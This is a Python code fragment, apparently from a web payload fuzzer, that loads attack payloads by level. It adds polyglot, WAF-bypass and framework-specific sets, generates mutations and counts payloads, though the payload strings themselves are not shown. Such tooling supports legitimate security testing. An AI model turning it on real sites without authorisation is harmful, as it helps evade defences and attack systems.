    # Polyglots
    if include_polyglots and level >= 2:
        payloads.extend(POLYGLOT_PAYLOADS)

    # WAF bypass
    if include_waf_bypass and level >= 2:
        payloads.extend(WAF_BYPASS_PAYLOADS)

    # Framework-specific
    if framework and framework.lower() in FRAMEWORK_PAYLOADS:
        payloads.extend(FRAMEWORK_PAYLOADS[framework.lower()])
    elif include_frameworks:
        for fw_payloads in FRAMEWORK_PAYLOADS.values():
            payloads.extend(fw_payloads)

    # Mutations
    if include_mutations:
        base_count = len(payloads)
        mutated: Set[str] = set()
        for p in payloads[:base_count]:
            mutations = generate_chained_mutations(p, depth=mutation_depth)
            mutated.update(mutations)
        payloads.extend(list(mutated))

    # Deduplicate
    seen: Set[str] = set()
    unique: List[str] = []
    for p in payloads:
        if p not in seen:
            seen.add(p)
            unique.append(p)

    logger.info(f"Loaded {len(unique)} payloads (level={level})")
    return unique


def load_custom_payloads(filepath: str) -> List[str]:
    """Load user-supplied payloads from a text file (one per line)."""
    path = Path(filepath)
    if not path.exists():
        logger.warning(f"Custom payload file not found: {filepath}")
        return []

    payloads: List[str] = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                payloads.append(line)

    logger.info(f"Loaded {len(payloads)} custom payloads from {filepath}")
    return payloads


def get_all_payload_count(level: int = 2) -> Dict[str, int]:
    """Return a breakdown of payload counts by category."""
    return {
        "basic": len(BASIC_PAYLOADS),
        "moderate": len(MODERATE_PAYLOADS),
        "aggressive": len(AGGRESSIVE_PAYLOADS),
        "polyglot": len(POLYGLOT_PAYLOADS),
        "waf_bypass": len(WAF_BYPASS_PAYLOADS),
        "framework": sum(len(v) for v in FRAMEWORK_PAYLOADS.values()),
        "dom": len(DOM_PAYLOADS),
        "total_at_level": len(get_payloads(level)),
    }
